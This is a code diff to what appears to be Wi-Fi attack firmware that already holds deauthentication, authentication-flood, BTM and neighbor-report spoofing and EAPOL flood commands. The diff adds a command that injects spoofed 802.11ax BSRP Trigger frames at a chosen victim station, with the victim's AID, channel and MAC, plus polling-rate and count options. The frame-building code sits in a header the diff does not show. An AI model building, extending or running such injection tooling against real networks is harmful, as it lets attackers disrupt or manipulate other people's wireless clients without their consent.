@@ -13,6 +13,7 @@
 #include <string.h>
 
 #include "authflood.h"
+#include "bsrp.h"
 #include "console_commands.h"
 #include "csa.h"
 #include "deauth.h"
@@ -658,6 +659,114 @@ const wb_method_t kBtmMethods[] = {
      .summary = "802.11v BTM Request spoof"},
     {.name = "stop", .args = nullptr, .n_args = 0, .handler = btm_bus_stop, .summary = "stop the BTM spoof"},
     {.name = "test", .args = nullptr, .n_args = 0, .handler = btm_bus_test, .summary = "dump the BTM Request bytes"},
+};
+
+// ---- BSRP (HE Buffer Status Report Poll Trigger) ----------------------------
+
+const wb_arg_spec_t kBsrpStartArgs[] = {
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
+    {.name = "aid", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "victim AID12 from an association response or real Trigger", .err = nullptr,
+     .def = 0, .min = 0, .max = 0},
+    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "victim BSS channel; must match the selected AP", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
+    {.name = "rate", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "milliseconds between polls; values below 45 are raised", .err = nullptr,
+     .def = 5, .min = 0, .max = 0},
+    {.name = "count", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "successful transmissions, 0 = until BSRPSTOP", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
+    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
+     .label = "victim station MAC (optional; otherwise learned by AID)",
+     .err = "station MAC must look like AABBCCDDEEFF", .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t bsrp_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  if (index < 0 || index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+  const long aid = wb_arg_num(args, "aid");
+  if (aid < 1 || aid > 2007) {
+    wb_reply_line(reply, "ERR aid must be 1..2007");
+    return WB_ERR_ARG;
+  }
+  const long ch = wb_arg_num(args, "ch");
+  if (ch < 1 || ch > 196) {
+    wb_reply_line(reply, "ERR channel must be 1..196");
+    return WB_ERR_ARG;
+  }
+  if (ch != WiFi.channel(index)) {
+    wb_reply_printf(reply, "ERR channel must match the selected AP channel (%d)\n",
+                    (int)WiFi.channel(index));
+    return WB_ERR_ARG;
+  }
+  const long rate = wb_arg_num(args, "rate");
+  if (rate < 1 || rate > 60000) {
+    wb_reply_line(reply, "ERR rate_ms must be 1..60000");
+    return WB_ERR_ARG;
+  }
+  const long count = wb_arg_num(args, "count");
+  if (count < 0 || count > 1000000) {
+    wb_reply_line(reply, "ERR count must be 0..1000000");
+    return WB_ERR_ARG;
+  }
+  if (baitap_running() && baitap_channel() != (uint8_t)ch) {
+    wb_reply_line(reply,
+                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
+    return WB_ERR_STATE;
+  }
+  uint8_t sta[6];
+  const bool have_sta = wb_arg_mac(args, "sta", sta);
+  attack_stop();
+  if (!bsrp_start(index, (uint16_t)aid, (uint8_t)ch, (uint32_t)rate, (uint32_t)count,
+                  have_sta ? sta : nullptr)) {
+    wb_reply_line(reply, "ERR cannot start BSRP on that network");
+    return WB_ERR_STATE;
+  }
+  if (rate < 45) {
+    wb_reply_printf(reply, "INFO BSRP rate_ms=%ld raised to 45 by the unicast TX guard\n", rate);
+  }
+  if (have_sta) {
+    char text[18];
+    mac_text(sta, text);
+    wb_reply_printf(reply, "OK BSRPSTA %s\n", text);
+  } else {
+    wb_reply_line(reply, "INFO BSRP waiting for an Association Response or real BSRP with this AID");
+  }
+  wb_reply_printf(reply, "OK BSRP %d aid=%ld ch=%ld rate=%u count=%ld ssid=%s\n", index, aid, ch,
+                  (unsigned)bsrp_rate_ms(), count, WiFi.SSID(index).c_str());
+  console_ui_log("bsrp started");
+  wbus_emit("bsrp.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t bsrp_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t frames = bsrp_frames();
+  const uint32_t errors = bsrp_tx_errors();
+  bsrp_stop();
+  wb_reply_printf(reply, "OK BSRPSTOP frames=%u tx_errors=%u references=%u\n",
+                  (unsigned)frames, (unsigned)errors, (unsigned)bsrp_reference_triggers());
+  console_ui_log("bsrp stopped");
+  wbus_emit("bsrp.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t bsrp_bus_test(const wb_args_t*, wb_reply_t*) {
+  bsrp_selftest();
+  return WB_OK;
+}
+
+const wb_method_t kBsrpMethods[] = {
+    {.name = "start", .args = kBsrpStartArgs, .n_args = 6, .handler = bsrp_bus_start,
+     .summary = "HE BSRP Trigger poll (frame-level; core fields await a reference capture)"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = bsrp_bus_stop,
+     .summary = "stop the BSRP poll"},
+    {.name = "test", .args = nullptr, .n_args = 0, .handler = bsrp_bus_test,
+     .summary = "dump and annotate the BSRP Trigger bytes"},
 };
 
 // ---- RRM (802.11k Neighbor Report Response) ---------------------------------
@@ -1364,6 +1473,11 @@ const wb_object_t kObjects[] = {
      .title = "802.11k Neighbor Report spoof",
      .methods = kRrmMethods,
      .n_methods = (int)(sizeof(kRrmMethods) / sizeof(kRrmMethods[0])),
+     .events = "state"},
+    {.name = "bsrp",
+     .title = "HE BSRP Trigger poll (frame-level)",
+     .methods = kBsrpMethods,
+     .n_methods = (int)(sizeof(kBsrpMethods) / sizeof(kBsrpMethods[0])),
      .events = "state"},
     {.name = "eapol",
      .title = "EAPOL-Start/Logoff flood",
